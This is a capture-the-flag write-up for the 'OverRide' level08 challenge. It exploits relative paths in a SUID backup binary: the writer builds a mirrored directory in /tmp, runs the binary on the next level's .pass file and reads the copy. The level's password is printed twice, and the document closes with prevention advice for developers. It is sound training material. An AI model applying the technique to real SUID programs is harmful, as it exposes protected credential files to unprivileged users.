# Level 8 - Path Traversal via Relative Paths

## Overview

This level demonstrates a **Path Traversal** vulnerability where a backup program uses relative paths without proper validation. The program copies a file specified by the user to a `./backups/` directory. By creating a matching directory structure in a writable location (like `/tmp`), we can trick the program into reading protected files and copying them to our accessible backup directory.

## Vulnerability: Path Traversal [CWE-22](https://cwe.mitre.org/data/definitions/22.html)

### Description

Path traversal (also known as directory traversal) allows an attacker to access files outside the intended directory by manipulating file paths:

**The Vulnerability**:
- Program uses **relative paths**: `./backups/`
- No validation of input path
- Creates backup at: `./backups/` + user_input
- Runs with SUID permissions (level09 privileges)

**How it Works**:
1. Program opens `./backups/.log` (relative to current directory)
2. Program opens the file specified in `argv[1]` (can be absolute path!)
3. Program creates backup at `./backups/` + `argv[1]`

**The Exploit**:
- If we run from `/tmp`, `./backups/` = `/tmp/backups/`
- We can create `/tmp/backups/home/users/level09/`
- Program reads `/home/users/level09/.pass` (has permission as level09)
- Program writes to `/tmp/backups/home/users/level09/.pass` (we can read!)

### Key Characteristics

- **Relative path dependency**: Uses `./` instead of absolute paths
- **No path validation**: Doesn't check if path contains traversal
- **SUID execution**: Runs with elevated privileges
- **Predictable behavior**: Always writes to `./backups/` + input

## Analysis

### Initial Reconnaissance

```bash
level08@OverRide:~$ ls -la
-rwsr-s---+ 1 level09 users 12975 Oct  2  2016 level08
```

Binary runs with `level09` privileges.

### Program Behavior

Running the program:

```bash
level08@OverRide:~$ ./level08
Usage: ./level08 filename

level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

The error shows the program tries to create: `./backups/` + `/home/users/level09/.pass`

This means it will try to create the file at:
```
./backups//home/users/level09/.pass
```

### Understanding the Logic

From the source code:

```c
// Build backup file path
strcpy(backup_path, "./backups/");
strncat(backup_path, argv[1], 99 - strlen(backup_path));

// Open/create backup file
backup_fd = open(backup_path, O_WRONLY | O_CREAT | O_EXCL, 0660);
```

The program:
1. Starts with `./backups/`
2. Concatenates the user-provided path
3. Tries to create the file

**Key Insight**: If we provide an absolute path like `/home/users/level09/.pass`, the program will try to create:
```
./backups//home/users/level09/.pass
```

## Exploitation

### Step 1: Move to a Writable Directory

```bash
level08@OverRide:~$ cd /tmp
```

### Step 2: Create the Directory Structure

We need to create the exact directory path that matches our target file:

```bash
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
```

This creates:
```
/tmp/backups/home/users/level09/
```

### Step 3: Run the Program

```bash
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
```

No error! The program successfully:
1. Opened `./backups/.log` → `/tmp/backups/.log` ✓
2. Opened `/home/users/level09/.pass` (with level09 privileges) ✓
3. Created `/tmp/backups/home/users/level09/.pass` ✓
4. Copied contents ✓

### Step 4: Read the Password

```bash
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```


## Why This Works

1. **SUID Permissions**: Program runs as level09, so it can read `/home/users/level09/.pass`
2. **Relative Paths**: `./backups/` is relative to current directory (`/tmp`)
3. **No Validation**: Program doesn't validate the input path
4. **Directory Creation**: We create the matching directory structure in a writable location
5. **File Copy**: Program copies the protected file to our accessible location

## Solution

### For Developers - How to Prevent This

1. **Use absolute paths**:
   ```c
   // BAD - Relative path
   strcpy(backup_path, "./backups/");

   // GOOD - Absolute path
   strcpy(backup_path, "/var/backups/");
   ```

2. **Validate input paths**:
   ```c
   // Check for path traversal
   if (strstr(filename, "..") || filename[0] == '/') {
       fprintf(stderr, "Invalid filename\n");
       return 1;
   }
   ```

3. **Use realpath() to canonicalize**:
   ```c
   char resolved_path[PATH_MAX];
   if (realpath(filename, resolved_path) == NULL) {
       perror("realpath");
       return 1;
   }
   // Check if resolved_path is within allowed directory
   if (strncmp(resolved_path, "/allowed/path/", 14) != 0) {
       fprintf(stderr, "Access denied\n");
       return 1;
   }
   ```


## Key Takeaways

- Relative paths are dangerous in SUID binaries
- Current working directory can be controlled by the user
- Path validation must check for absolute paths, not just `..`

## Password

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
